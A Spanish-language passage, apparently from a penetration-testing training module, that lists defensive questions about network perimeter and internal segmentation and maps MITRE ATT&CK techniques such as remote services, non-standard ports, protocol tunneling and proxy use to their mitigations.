Cuando se trabaja con una organización para ayudarles a evaluar la postura de seguridad de su entorno, puede ser útil comenzar desde el exterior y avanzar hacia adentro. Como probadores de penetración y profesionales de la seguridad, queremos que nuestros clientes tomen nuestros hallazgos y recomendaciones lo suficientemente en serio como para informar sus decisiones en el futuro. Queremos que entiendan que los problemas que descubrimos también pueden ser encontrados por individuos o grupos con intenciones menos honorables. Consideremos esto a través de un ejercicio mental usando el esquema a continuación. Siéntase libre de usar estas preguntas y consideraciones candentes para iniciar una conversación con amigos, miembros del equipo o si está solo, tome algunas notas y proponga el diseño más seguro que se le ocurra:

#### Perímetro Primero

- `What exactly are we protecting?`
- `What are the most valuable assets the organization owns that need securing?`
- `What can be considered the perimeter of our network?`
- `What devices & services can be accessed from the Internet? (Public-facing)`
- `How can we detect & prevent when an attacker is attempting an attack?`
- `How can we make sure the right person &/or team receives alerts as soon as something isn't right?`
- `Who on our team is responsible for monitoring alerts and any actions our technical controls flag as potentially malicious?`
- `Do we have any external trusts with outside partners?`
- `What types of authentication mechanisms are we using?`
- `Do we require Out-of-Band (OOB) management for our infrastructure. If so, who has access permissions?`
- `Do we have a Disaster Recovery plan?`

Al considerar estas preguntas con respecto al perímetro, podemos enfrentar la realidad de que una organización tiene una infraestructura que podría basarse en premisas y/o en la nube. La mayoría de las organizaciones en la actualidad operan infraestructuras de nube híbrida. Esto significa que algunas de las tecnologías utilizadas por las organizaciones pueden ejecutarse en la infraestructura de red y servidor propiedad de la organización, y algunas pueden estar alojadas por un proveedor de nube de 3rd party (AWS, Azure, GCP, etc.).

- Interfaz externa en un firewall
    - Capacidades de Cortafuegos de Próxima Generación
        - Bloqueo de conexiones sospechosas por IP
        - Asegurar que solo las personas aprobadas se conecten a las VPN
        - Desarrollar la capacidad de desconectar rápidamente conexiones sospechosas sin interrumpir las funciones comerciales

---

#### Consideraciones Internas

Many of the questions we ask for external considerations apply to our internal environment. There are a few differences; however, there are many different routes for ensuring the successful defense of our networks. Let's consider the following:

- `Are any hosts that require exposure to the internet properly hardened and placed in a DMZ network?`
- `Are we using Intrusion Detection and Prevention systems within our environment?`
- `How are our networks configured? Are different teams confined to their own network segments?`
- `Do we have separate networks for production and management networks?`
- `How are we tracking approved employees who have remote access to admin/management networks?`
- `How are we correlating the data we are receiving from our infrastructure defenses and end-points?`
- `Are we utilizing host-based IDS, IPS, and event logs?`

Nuestra mejor oportunidad de detectar, detener e incluso prevenir un ataque a menudo depende de nuestra capacidad para mantener la visibilidad dentro de nuestro entorno. Una implementación SIEM adecuada para correlacionar y analizar nuestros registros de host e infraestructura puede ser de gran ayuda. Combine eso con una segmentación de red adecuada, y se vuelve infinitamente más desafiante para un atacante obtener un punto de apoyo y pivotar hacia los objetivos. Cosas simples como garantizar que Steve de HR no pueda ver o acceder a la infraestructura de red, como conmutadores y enrutadores o paneles de administración para sitios web internos, pueden evitar el uso de usuarios estándar para el movimiento lateral.

---

## Desglose MITRE

Como una mirada diferente a esto, hemos desglosado las principales acciones que practicamos en este módulo y los controles mapeados basados en el TTP y una etiqueta MITRE. Cada etiqueta corresponde a una sección de la [Matrix Enterprise ATT&CK](https://attack.mitre.org/tactics/enterprise/) encontrado aquí. Cualquier etiqueta marcada como `TA` corresponde a una táctica general, mientras que una etiqueta marcada como `T###` es una técnica que se encuentra en la matriz bajo tácticas.

|**TTP**|**Etiqueta MITRE**|**Descripción**|
|---|---|---|
|`External Remote Services`|T1133|Tenemos opciones de prevención cuando se trata del uso de Servicios Remotos Externos. `First`tener un firewall adecuado para segmentar nuestro entorno del resto de Internet y controlar el flujo de tráfico es imprescindible. `Second`, deshabilitar y bloquear cualquier protocolo de tráfico interno para que no llegue al mundo siempre es una buena práctica. `Third`, usando una VPN o algún otro mecanismo que requiera que un host sea `logically` ubicado dentro de la red antes de que obtenga acceso a esos servicios, es una excelente manera de asegurarse de que no esté filtrando datos que no debería.|
|`Remote Services`|T1021|La autenticación multifactor puede ser de gran ayuda cuando se trata de mitigar el uso no autorizado de servicios remotos como SSH y RDP. Incluso si se tomara la contraseña de un usuario, el atacante aún necesitaría una forma de adquirir la cadena de su MFA de elección. Limitar las cuentas de usuario con permisos de acceso remoto y separar las tareas de quién puede acceder de forma remota a qué partes de una red puede ser de gran ayuda. Utilizar su firewall en red y el firewall incorporado en sus hosts para limitar las conexiones entrantes/salientes para servicios remotos es una victoria fácil para los defensores. Detendrá el intento de conexión a menos que sea de una red interna o externa autorizada. Cuando se trata de dispositivos de infraestructura como enrutadores y conmutadoressolo exponer los servicios y puertos de administración remota a una red Out Of Band (OOB) es una mejor práctica que siempre debe seguirse. Hacer esto garantiza que cualquier persona que haya comprometido las redes empresariales no pueda simplemente saltar del host de un usuario normal a la infraestructura.|
|`Use of Non-Standard Ports`|T1571|Esta técnica puede ser difícil de atrapar. Los atacantes a menudo usarán un protocolo común como `HTTP` o `HTTPS` para comunicarse con su entorno. Es difícil ver qué está pasando, especialmente con el uso de HTTPS, pero los emparejamientos de protocolos como estos con un puerto no estándar (44`4` en lugar de 44`3`, por ejemplo) puede indicarnos que ocurra algo sospechoso. Los atacantes a menudo tratarán de trabajar de esta manera, por lo que tienen un sólido `baseline` de lo que los puertos/protocolos se usan comúnmente en su entorno puede ser de gran ayuda cuando se trata de detectar lo malo. El uso de algún tipo de sistema de Prevención o Detección de Intrusión de Red también puede ayudar a detectar y cerrar el tráfico potencialmente malicioso.|
|`Protocol Tunneling`|T1572|Este es un problema interesante para abordar. Muchos actores utilizan túneles de protocolo para ocultar sus canales de comunicación. A menudo veremos cosas como las que practicamos en este módulo (tunelizar otro tráfico a través de un túnel SSH) e incluso el uso de protocolos como DNS para pasar instrucciones de fuentes externas a un host interno a la red. Tomarse el tiempo para bloquear qué puertos y protocolos pueden hablar dentro/fuera de sus redes es imprescindible. Si tiene un dominio en ejecución y aloja un servidor DC y DNS, sus hosts no deberían tener ninguna razón para llegar externamente para la resolución de nombres. No permitir la resolución de DNS de la web (excepto a hosts específicos como el servidor DNS) puede ayudar con un problema como este. Tener una buena solución de monitoreo también puede observar los patrones de tráfico y lo que se conoce como `Beaconing`. Incluso si el tráfico está encriptado, es posible que veamos solicitudes que ocurren en un patrón a lo largo del tiempo. Este es un rasgo común de un canal C2.|
|`Proxy Use`|T1090|El uso de un punto proxy es común entre los actores de amenazas. Muchos usarán un punto proxy o distribuirán su tráfico a través de múltiples hosts para que no expongan directamente su infraestructura. Al usar un proxy, no hay conexión directa del entorno de la víctima al host del atacante en un momento dado. La detección y prevención del uso de proxy es un poco difícil, ya que requiere un conocimiento íntimo del flujo neto común dentro de su entorno. La ruta más efectiva es mantener una lista de dominios permitidos/bloqueados y direcciones IP. Cualquier cosa no permitida explícitamente será bloqueada hasta que deje pasar el tráfico.|
|`LOTL`|N/A|Puede ser difícil detectar a un atacante mientras está utilizando los recursos disponibles. Aquí es donde tener una línea de base de tráfico de red y comportamiento del usuario es útil. Si sus defensores entienden cómo es el día a día normal para su red, tiene la oportunidad de detectar lo anormal. Ver los shells de comandos y utilizar una solución EDR y AV configurada correctamente contribuirá en gran medida a proporcionarle visibilidad. Tener algún tipo de monitoreo de redes y registro de alimentación en un sistema común como un SIEM que los defensores verifican, contribuirá en gran medida a ver un ataque en las etapas iniciales en lugar de después del hecho.|